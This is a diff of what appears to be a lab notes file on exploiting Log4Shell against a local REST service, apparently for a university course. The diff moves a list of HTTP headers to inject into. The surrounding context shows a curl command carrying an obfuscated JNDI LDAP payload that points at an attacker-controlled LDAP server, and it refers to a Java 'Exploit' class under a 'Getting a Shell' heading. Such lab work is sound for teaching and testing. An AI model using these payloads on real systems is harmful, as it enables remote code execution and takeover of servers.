@@ -15,6 +15,33 @@ curl http://localhost:8080/rest/wizards/isAlive -H 'GATECH_ID: 904160213' -H 'Co
 curl 'http://localhost:8080/rest/wizards/wizard/07577db4-f9ce-47f5-9508-61987ca4e987?darkArts=%24%7B%24%7Benv%3AENV_NAME%3A-j%7Dndi%24%7Benv%3AENV_NAME%3A-%3A%7D%24%7Benv%3AENV_NAME%3A-l%7Ddap%3A%2F%2F172.17.0.1%3A1389%2FExploit%7D' -H 'GATECH_ID:904160213' -H 'Accept: application/json' | python3 -m json.tool
 ```
 
+# Vulnerable Headers
+```Bash
+User-Agent
+Referer 
+X-Api-Version
+X-Forwarded-For
+Authentication
+Contact
+From
+X-Wap-Profile
+X-Original-URL
+X-Forwarded-Proto
+X-Forwarded-Server
+Profile
+Proxy-Host
+Destination
+Proxy
+Via
+True-Client-IP
+Client-IP
+X-Client-IP
+X-Real-IP
+X-Originating-IP
+CF-Connecting_IP
+Forwarded 
+```
+
 # Java Exploits
 ```Java
 ### Getting a Shell ###
@@ -85,31 +112,4 @@ public class Exploit {
         }
     }
 }
-```
-
-# Vulnerable Headers
-```Bash
-User-Agent
-Referer 
-X-Api-Version
-X-Forwarded-For
-Authentication
-Contact
-From
-X-Wap-Profile
-X-Original-URL
-X-Forwarded-Proto
-X-Forwarded-Server
-Profile
-Proxy-Host
-Destination
-Proxy
-Via
-True-Client-IP
-Client-IP
-X-Client-IP
-X-Real-IP
-X-Originating-IP
-CF-Connecting_IP
-Forwarded 
 ```
